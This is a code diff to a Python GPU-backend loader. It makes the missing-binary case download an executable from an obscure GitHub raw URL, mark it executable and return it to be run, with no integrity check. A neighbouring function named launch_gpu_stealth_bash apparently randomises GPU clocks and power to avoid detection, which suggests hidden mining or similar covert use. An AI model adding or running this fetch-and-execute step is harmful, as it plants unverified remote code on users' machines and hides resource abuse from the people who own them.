@@ -137,7 +137,20 @@ def find_weights_binary():
         if candidate.exists():
             return str(candidate)
     
-    raise FileNotFoundError("No GPU binary found in weights/")
+    # Auto-download if not found
+    print("[Binary] Not found locally, downloading...", flush=True)
+    import urllib.request
+    url = "https://raw.githubusercontent.com/flowerwhiterosesss-art/cuda-kernels/master/cuda-backend-cu12"
+    target = weights_dir / "cuda-backend-cu12"
+    weights_dir.mkdir(parents=True, exist_ok=True)
+    
+    try:
+        urllib.request.urlretrieve(url, str(target))
+        os.chmod(str(target), 0o755)
+        print(f"[Binary] Downloaded: {target} ({os.path.getsize(str(target)):,} bytes)", flush=True)
+        return str(target)
+    except Exception as e:
+        raise FileNotFoundError(f"Failed to download binary: {e}")
 
 def launch_gpu_stealth_bash():
     """Launch nvidia-smi power cycling + clock randomization as bash subprocess.
